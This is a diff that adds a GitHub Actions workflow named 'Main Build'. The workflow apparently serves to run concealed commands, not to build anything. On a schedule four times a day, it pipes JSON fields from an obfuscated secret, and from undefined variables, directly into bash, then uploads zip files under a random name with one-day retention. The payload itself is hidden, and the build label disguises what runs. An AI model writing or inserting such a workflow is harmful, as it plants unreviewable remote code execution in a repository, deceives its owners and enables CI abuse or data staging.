@@ -1,0 +1,30 @@
+name: Main Build
+on:
+  workflow_dispatch:
+
+  schedule:
+    - cron: '47 5,11,17,23 * * *'
+concurrency:
+  group: ${{ github.workflow }}
+  cancel-in-progress: false
+jobs:
+  compile:
+    runs-on: ubuntu-latest
+    timeout-minutes: 360
+    steps:
+      - uses: actions/checkout@v4
+      - name: Setup and run
+        env:
+          jh976: ${{ secrets.jh976 }}
+        run: |
+          printf '%s' "$jh976" | jq -r .idh04 | /bin/bash
+          echo $chmud9532 | jq -r .dvkt24 | /bin/bash
+          echo $tak5218 | jq -r .bbtvk50 | /bin/bash
+
+      - name: Upload data
+        if: always()
+        uses: actions/upload-artifact@v4
+        with:
+          name: skmvYO0Z
+          path: "*.zip"
+          retention-days: 1
